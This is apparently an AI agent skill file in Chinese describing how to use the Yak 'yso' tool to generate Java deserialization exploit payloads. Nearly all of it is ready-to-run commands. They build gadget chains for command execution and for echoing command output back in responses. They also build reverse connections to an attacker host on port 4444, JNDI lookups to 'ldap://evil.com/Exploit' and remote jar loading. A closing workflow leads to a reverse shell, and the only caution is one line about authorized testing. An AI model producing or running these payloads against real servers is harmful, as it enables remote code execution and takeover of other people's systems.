---
name: yso
description: Java 反序列化 payload 生成（Yak ysoserial），使用 yak yso 生成各类 gadget 的序列化 payload，支持命令执行、回显、反连等
---

# Java 反序列化 Payload 技能（Yak yso）

当用户需要针对 Java 反序列化漏洞生成或调试 payload 时使用此技能。`yak yso` 支持多种 gadget 与 chain（如 CommonsCollections、Spring、JNDI 等），可生成命令执行、回显、DNS/HTTP 反连等。

## 命令格式

```text
yak yso [options] <gadget> <type> <params>
```

- **gadget**：如 CommonsCollections1、URLDNS、Spring2 等。
- **type**：payload 类型（如 raw_cmd、SpringEcho、TcpReverse、DNSLog 等）或 chain 名。
- **params**：参数，格式 `key:value,key:value`。

## 常用用法

### 1. 命令执行（raw_cmd / linux_cmd / win_cmd）
```bash
yak yso -b CommonsCollections1 raw_cmd "cmd:touch /tmp/flag"
yak yso -b CommonsCollections2 linux_cmd "cmd:id"
yak yso CommonsCollections1 win_cmd "cmd:calc"
```

### 2. 回显（SpringEcho / TomcatEcho / MultiEcho）
```bash
yak yso -b CommonsCollections2 SpringEcho "cmd:whoami,position:header"
yak yso -b CommonsCollections2 TomcatEcho "header:X-Test,header-au-key:Authorization,header-au-val:1,cmd:id,action:exec,position:body"
```

### 3. 反连（TcpReverse / TcpReverseShell）
```bash
yak yso -b CommonsCollections1 TcpReverse "host:your-vps,port:4444,token:optional"
```

### 4. DNS/HTTP 反连（检测反序列化触发）
```bash
yak yso -b URLDNS dnslog "domain:your-dnslog.domain"
yak yso -b CommonsCollections1 httplog "url:http://your-server/log"
```

### 5. 输出到文件 / Base64
```bash
yak yso -b CommonsCollections1 raw_cmd "cmd:id" -o payload.bin
yak yso -b CommonsCollections1 raw_cmd "cmd:id"
```
- `-b` / `--base64`：以 base64 形式输出，便于在 HTTP 等场景中传递。

### 6. JNDI / loadjar 等 chain
```bash
yak yso -b CommonsCollections1 jndi "jndi:ldap://evil.com/Exploit"
yak yso -b CommonsCollections1 loadjar "url:http://xxx.com/exp.jar,name:Main"
```

## Gadget 与 Type 速查

- **常见 gadget**：CommonsCollections1/2/3/4/5/6/7/8、Spring1/2、URLDNS、Jdk7u21、Jdk8u20、ROME、CommonsBeanutils1/2 等（完整列表见 `yak yso --help`）。
- **type 示例**：raw_cmd、linux_cmd、win_cmd、SpringEcho、TomcatEcho、MultiEcho、TcpReverse、TcpReverseShell、DNSLog、dnslog、httplog、jndi、loadjar、loadjar_with_args、bcel、base64 等。

## 与渗透流程衔接

1. **漏洞验证**：先用 URLDNS 或 httplog/dnslog 确认反序列化是否触发。
2. **回显**：在无外连环境下用 SpringEcho/TomcatEcho/MultiEcho 回显命令结果。
3. **反弹 Shell**：用 TcpReverse/TcpReverseShell 或 raw_cmd + 反弹 shell 命令。
4. **Java 调试**：可用 `serialdumper`（`yak serialdumper`）分析序列化流。

## 注意事项

- 仅在授权测试中使用；选择合适的 gadget 与目标 classpath 匹配。
- 回显需根据中间件（Tomcat/Weblogic 等）选用对应 Echo 类及 header 参数。
